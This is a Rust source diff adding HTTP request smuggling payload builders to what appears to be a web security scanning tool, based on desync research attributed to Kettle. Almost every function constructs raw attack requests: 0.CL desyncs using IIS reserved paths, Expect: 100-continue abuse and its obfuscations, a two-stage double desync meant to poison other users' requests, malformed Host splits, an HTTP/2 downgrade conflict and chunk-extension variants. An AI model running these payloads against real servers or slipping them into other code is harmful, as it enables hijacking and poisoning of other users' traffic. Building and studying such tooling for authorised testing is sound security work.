@@ -30,6 +30,10 @@ pub enum SmugglingVariant {
     DetectClTe,
     DetectTeCl,
     MethodBody,
+    /// Kettle BH25: 0.CL desync — front-end ignores CL, back-end honors it.
+    KettleDesync,
+    /// Kettle BH25: Browser-powered H2→H1 downgrade with conflicting CL.
+    Browser0CL,
 }
 
 pub const DEFAULT_HTTP2_SETTINGS: &str = "AAMAAABkAARAAAAAAAIAAAAA";
@@ -840,6 +844,487 @@ pub fn all_payloads(
     out.push(h2c_post_smuggle(host, b"test", None)?);
     out.push(websocket_smuggle_custom(host, "/ws", None, None)?);
     Ok(out)
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// Kettle BH USA 2025 — "HTTP/1.1 Must Die: The Desync Endgame" primitives
+// ═══════════════════════════════════════════════════════════════════════════
+
+/// Registry of all Kettle BH25 primitive names for integration testing.
+pub const KETTLE_DESYNC_PRIMITIVES: &[&str] = &[
+    "zero_cl_desync",
+    "vh_masked_header",
+    "expect_100_smuggle",
+    "expect_100_obfuscated",
+    "cl_zero_via_expect",
+    "double_desync",
+    "malformed_host_split",
+    "browser_powered_h2_downgrade",
+    "line_folded_header",
+    "chunk_extension_variants",
+];
+
+/// IIS reserved device paths that trigger an early response, preventing
+/// deadlock in 0.CL desync.  The front-end strips or ignores Content-Length;
+/// IIS returns a 400/response early so the back-end never hangs.
+pub const IIS_RESERVED_PATHS: &[&str] = &["/con", "/aux", "/nul", "/prn", "/com1", "/lpt1"];
+
+/// **0.CL desync** (Kettle BH25 §3.1).
+///
+/// The front-end ignores `Content-Length` and routes the request based on
+/// method/path alone.  The back-end treats `Content-Length: <attack_cl>` as
+/// authoritative and reads that many bytes off the connection — including the
+/// `smuggled_request` bytes that follow — poisoning the next victim's request
+/// buffer.
+///
+/// IIS reserved paths (`/con`, `/aux`, `/nul`, `/prn`, `/com1`, `/lpt1`)
+/// provide the early-response gadget: IIS sends a response immediately without
+/// consuming body bytes, so the poisoned bytes stay in the back-end's read
+/// buffer and get prepended to the next request rather than blocking the
+/// connection.
+///
+/// Wire format:
+/// ```text
+/// GET /<reserved-path> HTTP/1.1\r\n
+/// Host: t\r\n
+/// Content-Length: <attack_cl>\r\n
+/// \r\n
+/// <smuggled_request>
+/// ```
+pub fn zero_cl_desync(
+    reserved_path: &str,
+    smuggled_request: &str,
+    attack_cl: usize,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+    crate::safety::guard_no_crlf(reserved_path)?;
+    crate::safety::guard_prefix_len(reserved_path, 256)?;
+    let smuggled = validate_prefix(smuggled_request)?;
+    let raw = format!(
+        "GET {reserved_path} HTTP/1.1\r\n\
+         Host: t\r\n\
+         Content-Length: {attack_cl}\r\n\
+         \r\n\
+         {smuggled}"
+    );
+    Ok(SmugglingPayload {
+        description: format!("0.CL desync path={reserved_path} attack_cl={attack_cl}"),
+        variant: SmugglingVariant::KettleDesync,
+        raw_bytes: raw.into_bytes(),
+        canary: Canary::generate(),
+    })
+}
+
+/// **V-H header masking** (Kettle BH25 §4.2).
+///
+/// A leading space (or character substitution like `Host` → `Xost`) makes the
+/// header visible to the front-end parser while the back-end parser ignores or
+/// misroutes it.  Both the space-prefix variant and the name-rewrite variant
+/// are returned.
+///
+/// Wire format (space-prefix):
+/// ```text
+/// GET / HTTP/1.1\r\n
+///  <masked_name>: <value>\r\n
+/// \r\n
+/// ```
+pub fn vh_masked_header(masked_name: &str, value: &str) -> Vec<SmugglingPayload> {
+    crate::safety::guard_no_crlf(masked_name).ok();
+    // Variant 1: space-prefix on the header name.
+    // NOTE: Rust backslash-continuation strips leading whitespace, so we
+    // concatenate the SP-prefixed line explicitly to preserve the leading space.
+    let space_raw = format!(
+        "GET / HTTP/1.1\r\nHost: t\r\n {masked_name}: {value}\r\n\r\n"
+    );
+    // Variant 2: substitute the first character of the header name with 'X'
+    // (e.g., Host → Xost).  If the name is empty we fall back to "X-Unknown".
+    let xname = if masked_name.is_empty() {
+        "X-Unknown".to_owned()
+    } else {
+        format!("X{}", &masked_name[masked_name.char_indices().nth(1).map_or(masked_name.len(), |(i, _)| i)..])
+    };
+    let xname_raw = format!(
+        "GET / HTTP/1.1\r\n\
+         Host: t\r\n\
+         {xname}: {value}\r\n\
+         \r\n"
+    );
+    vec![
+        SmugglingPayload {
+            description: format!("V-H masked space-prefix: {masked_name}"),
+            variant: SmugglingVariant::KettleDesync,
+            raw_bytes: space_raw.into_bytes(),
+            canary: Canary::generate(),
+        },
+        SmugglingPayload {
+            description: format!("V-H masked char-rewrite: {masked_name} → {xname}"),
+            variant: SmugglingVariant::KettleDesync,
+            raw_bytes: xname_raw.into_bytes(),
+            canary: Canary::generate(),
+        },
+    ]
+}
+
+/// **Expect: 100-continue 0.CL abuse** (Kettle BH25 §5.1).
+///
+/// Many front-ends respond to `Expect: 100-continue` immediately with a
+/// `100 Continue` response and do not wait for body bytes.  This means the
+/// front-end treats the request as complete (0 body bytes consumed), while the
+/// back-end honors `Content-Length: <cl>` and reads that many bytes —
+/// including `smuggled_request` — off the shared connection.
+///
+/// Wire format:
+/// ```text
+/// GET /logout HTTP/1.1\r\n
+/// Host: t\r\n
+/// Expect: 100-continue\r\n
+/// Content-Length: <cl>\r\n
+/// \r\n
+/// <smuggled_request>
+/// ```
+pub fn expect_100_smuggle(
+    smuggled_request: &str,
+    cl: usize,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+    let smuggled = validate_prefix(smuggled_request)?;
+    let raw = format!(
+        "GET /logout HTTP/1.1\r\n\
+         Host: t\r\n\
+         Expect: 100-continue\r\n\
+         Content-Length: {cl}\r\n\
+         \r\n\
+         {smuggled}"
+    );
+    Ok(SmugglingPayload {
+        description: format!("Expect 100-continue 0.CL abuse cl={cl}"),
+        variant: SmugglingVariant::KettleDesync,
+        raw_bytes: raw.into_bytes(),
+        canary: Canary::generate(),
+    })
+}
+
+/// **Obfuscated Expect** (Kettle BH25 §5.2).
+///
+/// Variants that obfuscate `100-continue` so one parser recognises the Expect
+/// directive and another doesn't:
+///
+/// - `prefix + " 100-continue" + suffix` — e.g., `"y 100-continue"`, `" 100-continue "`
+/// - Leading space: `" 100-continue"`
+/// - Trailing space: `"100-continue "`
+/// - Trailing tab: `"100-continue\t"`
+/// - Case flip: `"100-Continue"`, `"100-CONTINUE"`
+///
+/// `prefix` and `suffix` are injected around `100-continue`; callers can
+/// pass empty strings for the canonical variants.
+pub fn expect_100_obfuscated(
+    prefix: &str,
+    suffix: &str,
+    smuggled_request: &str,
+    cl: usize,
+) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
+    let smuggled = validate_prefix(smuggled_request)?;
+    let variants: &[(&str, &str)] = &[
+        (prefix, suffix),                   // caller-supplied
+        ("", " "),                           // trailing space
+        (" ", ""),                           // leading space
+        ("", "\t"),                          // trailing tab
+        ("y ", ""),                          // "y 100-continue" (Kettle example)
+        ("", ""),                            // canonical — for baseline reference
+    ];
+    let case_variants: &[&str] = &[
+        "100-Continue",
+        "100-CONTINUE",
+        "100-continue",
+    ];
+    let mut out = Vec::new();
+    for (pre, suf) in variants {
+        let expect_value = format!("{pre}100-continue{suf}");
+        let raw = format!(
+            "GET /logout HTTP/1.1\r\n\
+             Host: t\r\n\
+             Expect: {expect_value}\r\n\
+             Content-Length: {cl}\r\n\
+             \r\n\
+             {smuggled}"
+        );
+        out.push(SmugglingPayload {
+            description: format!("Obfuscated Expect '{expect_value}'"),
+            variant: SmugglingVariant::KettleDesync,
+            raw_bytes: raw.into_bytes(),
+            canary: Canary::generate(),
+        });
+    }
+    for token in case_variants {
+        let raw = format!(
+            "GET /logout HTTP/1.1\r\n\
+             Host: t\r\n\
+             Expect: {token}\r\n\
+             Content-Length: {cl}\r\n\
+             \r\n\
+             {smuggled}"
+        );
+        out.push(SmugglingPayload {
+            description: format!("Obfuscated Expect case '{token}'"),
+            variant: SmugglingVariant::KettleDesync,
+            raw_bytes: raw.into_bytes(),
+            canary: Canary::generate(),
+        });
+    }
+    Ok(out)
+}
+
+/// **CL.0 via Expect** (Kettle BH25 §5.3).
+///
+/// `POST /images/` with `Expect: 100-continue` — many static-file or image
+/// endpoints return `405 Method Not Allowed` or `100 Continue` immediately,
+/// causing the front-end to treat the body as consumed (CL.0 equivalent).
+/// The back-end, which routes to a different handler, honors `Content-Length`
+/// and reads `smuggled_request` bytes from the connection.
+///
+/// Wire format:
+/// ```text
+/// POST /images/ HTTP/1.1\r\n
+/// Host: t\r\n
+/// Expect: 100-continue\r\n
+/// Content-Length: <cl>\r\n
+/// \r\n
+/// <smuggled_request>
+/// ```
+pub fn cl_zero_via_expect(
+    smuggled_request: &str,
+    cl: usize,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+    let smuggled = validate_prefix(smuggled_request)?;
+    let raw = format!(
+        "POST /images/ HTTP/1.1\r\n\
+         Host: t\r\n\
+         Expect: 100-continue\r\n\
+         Content-Length: {cl}\r\n\
+         \r\n\
+         {smuggled}"
+    );
+    Ok(SmugglingPayload {
+        description: format!("CL.0 via Expect /images/ cl={cl}"),
+        variant: SmugglingVariant::KettleDesync,
+        raw_bytes: raw.into_bytes(),
+        canary: Canary::generate(),
+    })
+}
+
+/// **Double desync — 0.CL → CL.0 conversion** (Kettle BH25 §6).
+///
+/// Stage 1: A 0.CL desync on `stage1_path` plants a partial HTTP/1.1 request
+/// in the back-end's buffer — specifically the beginning of a CL.0 attack.
+/// Stage 2: A normal CL.0 request on `stage2_path` completes the poisoned
+/// request such that a victim's request is mis-routed.
+///
+/// Returns the concatenated raw bytes of both frames so the caller can send
+/// them back-to-back on a single pipelined connection.
+///
+/// Wire format (stage 1 then stage 2):
+/// ```text
+/// GET /stage1 HTTP/1.1\r\nHost: t\r\nContent-Length: <n>\r\n\r\nPOST /stage2 HTTP/1.1\r\nHost: t\r\nContent-Length: 0\r\n\r\n<payload>
+/// ```
+pub fn double_desync(
+    stage1_path: &str,
+    stage2_path: &str,
+    payload: &str,
+) -> Result<Vec<u8>, crate::safety::SafetyError> {
+    crate::safety::guard_no_crlf(stage1_path)?;
+    crate::safety::guard_no_crlf(stage2_path)?;
+    crate::safety::guard_prefix_len(stage1_path, 256)?;
+    crate::safety::guard_prefix_len(stage2_path, 256)?;
+    let payload = validate_prefix(payload)?;
+    // Stage 2 body: a CL.0 request whose body is the caller's payload.
+    let stage2_body = format!(
+        "POST {stage2_path} HTTP/1.1\r\n\
+         Host: t\r\n\
+         Content-Length: 0\r\n\
+         \r\n\
+         {payload}"
+    );
+    // Stage 1: 0.CL attack; attack_cl = len of stage2 body so back-end reads it all.
+    let attack_cl = stage2_body.len();
+    let stage1 = format!(
+        "GET {stage1_path} HTTP/1.1\r\n\
+         Host: t\r\n\
+         Content-Length: {attack_cl}\r\n\
+         \r\n\
+         {stage2_body}"
+    );
+    Ok(stage1.into_bytes())
+}
+
+/// **H-V malformed Host (ALB + IIS)** (Kettle BH25 §7).
+///
+/// AWS ALB rejects requests whose `Host` header contains certain delimiter
+/// characters (`/`, `:`, `\\`, `?`, `#`) with a 400.  IIS accepts them and
+/// routes them to unexpected handler chains.  By sending a request that ALB
+/// would reject *but* has already been forwarded to IIS (e.g. via a desync),
+/// a poisoned connection can serve IIS-processed responses to victims.
+///
+/// Returns a candidate set of probes, one per delimiter character, with the
+/// delimiter inserted at position 3 in the host value to produce a variety of
+/// split positions.
+pub fn malformed_host_split(host_value: &str) -> Vec<SmugglingPayload> {
+    let delimiters = [':', '/', '\\', '?', '#', '@', '[', ']'];
+    delimiters
+        .iter()
+        .map(|&delim| {
+            // Insert delimiter after first 3 chars (or at end if shorter).
+            let insert_pos = host_value.len().min(3);
+            let mangled = format!(
+                "{}{}{}",
+                &host_value[..insert_pos],
+                delim,
+                &host_value[insert_pos..]
+            );
+            let raw = format!(
+                "GET / HTTP/1.1\r\n\
+                 Host: {mangled}\r\n\
+                 \r\n"
+            );
+            SmugglingPayload {
+                description: format!("Malformed Host ALB+IIS delim={delim:?} host={mangled}"),
+                variant: SmugglingVariant::KettleDesync,
+                raw_bytes: raw.into_bytes(),
+                canary: Canary::generate(),
+            }
+        })
+        .collect()
+}
+
+/// **Browser-powered H2→H1 downgrade with conflicting Content-Length**
+/// (Kettle BH25 §8, H2.0 / H2.CL / H2.TE).
+///
+/// After downgrade from HTTP/2 to HTTP/1.1 a front-end proxy may inherit an
+/// HTTP/2 body-framing field (`content-length`) that conflicts with what the
+/// HTTP/1.1 back-end expects.  This function produces an [`H2Evasion`]
+/// descriptor whose `headers` carry the conflicting `content-length` and an
+/// embedded `transfer-encoding: chunked` designed to trigger H2.CL or H2.TE
+/// desync upon downgrade.
+///
+/// Uses the existing [`H2Evasion`] struct from `h2_evasion.rs` — no new
+/// constructors added there.
+pub fn browser_powered_h2_downgrade(
+    method: &str,
+    path: &str,
+    body: &[u8],
+    declared_cl: usize,
+) -> Result<crate::h2_evasion::H2Evasion, crate::safety::SafetyError> {
+    crate::safety::guard_no_crlf(method)?;
+    crate::safety::guard_no_crlf(path)?;
+    crate::safety::guard_prefix_len(method, 32)?;
+    crate::safety::guard_prefix_len(path, 2048)?;
+    // Build chunk-encoded representation of the body for H2.TE conflict.
+    let body_hex = format!("{:x}", body.len());
+    let chunked_body = if body.is_empty() {
+        "0\r\n\r\n".to_owned()
+    } else {
+        let body_str = String::from_utf8_lossy(body);
+        format!("{body_hex}\r\n{body_str}\r\n0\r\n\r\n")
+    };
+    Ok(crate::h2_evasion::H2Evasion {
+        name: "Browser-powered H2 downgrade (Kettle BH25)",
+        description: "H2.CL/H2.TE: declared CL conflicts with body framing after H2→H1 downgrade",
+        pseudo_headers: vec![
+            (":method".into(), method.to_owned()),
+            (":path".into(), path.to_owned()),
+            (":scheme".into(), "https".into()),
+        ],
+        headers: vec![
+            // Conflicting CL — front-end inherits from H2, back-end re-parses.
+            ("content-length".into(), declared_cl.to_string()),
+            // TE header causes H2.TE if the back-end is TE-first.
+            ("transfer-encoding".into(), "chunked".into()),
+            // Body as a separate content field for frame-level replay.
+            ("x-body-frame".into(), chunked_body),
+        ],
+        needs_continuation_split: false,
+        target_flaw: crate::h2_evasion::H2TargetFlaw::ProtocolDowngrade,
+        end_stream: Some(!body.is_empty()),
+        end_headers: Some(true),
+    })
+}
+
+/// **Obsolete line-folding** (Kettle BH25 §9, RFC 7230 §3.2.6 obsolete rule).
+///
+/// RFC 2616 allowed header values to be folded across lines by inserting a
+/// `\r\n` followed by at least one SP or HTAB.  RFC 7230 deprecated this
+/// ("obs-fold") but many lenient parsers still accept it.  A strict WAF
+/// rejects or normalises it differently from a lenient back-end, creating a
+/// parsing disagreement.
+///
+/// The `fold_text` is appended as a continuation line after `value`.
+///
+/// Wire format:
+/// ```text
+/// <header>: <value>\r\n
+///  <fold_text>\r\n
+/// ```
+pub fn line_folded_header(header: &str, value: &str, fold_text: &str) -> Vec<u8> {
+    // We deliberately allow CRLF in value/fold_text here — that's the technique.
+    // The header name itself must not contain CRLF.
+    let raw = format!("{header}: {value}\r\n {fold_text}\r\n");
+    raw.into_bytes()
+}
+
+/// **Chunk extension variants** (Kettle BH25 §10).
+///
+/// Returns 8+ variants of chunk-encoded `body` where the chunk-size line
+/// includes various extension forms.  Strict parsers reject certain extensions;
+/// lenient parsers accept them, producing disagreement on where the chunk data
+/// ends.
+///
+/// Variants:
+/// 1. `5;x=y`           — standard key=value extension
+/// 2. `5;\tx=y`         — tab-separated extension name
+/// 3. `5;;x=y`          — duplicate semicolons
+/// 4. `5;`              — empty extension (semicolon, no name)
+/// 5. `5;x="y;z"`       — quoted-string extension with semicolon inside
+/// 6. `5;x=y;z=w`       — two extensions
+/// 7. `5;0x=y`          — extension name starts with digit
+/// 8. `5;\x00ext=v`     — NUL byte in extension (null-terminator confusion)
+///
+/// Each `SmugglingPayload` uses the chunk line to wrap a single-byte chunk
+/// (`X`) so the body is deterministic regardless of `body` length.  The full
+/// `body` is appended after the `0\r\n\r\n` terminator as the smuggled prefix.
+pub fn chunk_extension_variants(body: &str) -> Vec<SmugglingPayload> {
+    // Sanitise smuggled body — length-only guard (no CRLF strip, body may have them).
+    let smuggled = body.to_owned();
+    let chunk_byte = "X";
+    let chunk_size = chunk_byte.len(); // 1
+    let hex_size = format!("{chunk_size:x}");
+    let extensions: &[(&str, &str)] = &[
+        ("standard key=value",    ";x=y"),
+        ("tab before ext name",   ";\tx=y"),
+        ("duplicate semicolons",  ";;x=y"),
+        ("empty extension",       ";"),
+        ("quoted-string ext",     ";x=\"y;z\""),
+        ("two extensions",        ";x=y;z=w"),
+        ("digit-start ext name",  ";0x=y"),
+        ("NUL in extension",      ";\x00ext=v"),
+    ];
+    extensions
+        .iter()
+        .map(|(desc, ext)| {
+            let body_section = format!(
+                "{hex_size}{ext}\r\n{chunk_byte}\r\n0\r\n\r\n{smuggled}"
+            );
+            let raw = format!(
+                "POST / HTTP/1.1\r\n\
+                 Host: t\r\n\
+                 Transfer-Encoding: chunked\r\n\
+                 \r\n\
+                 {body_section}"
+            );
+            SmugglingPayload {
+                description: format!("Chunk-ext {desc}: {hex_size}{ext}"),
+                variant: SmugglingVariant::ChunkExtension,
+                raw_bytes: raw.into_bytes(),
+                canary: Canary::generate(),
+            }
+        })
+        .collect()
 }
 
 #[cfg(test)]
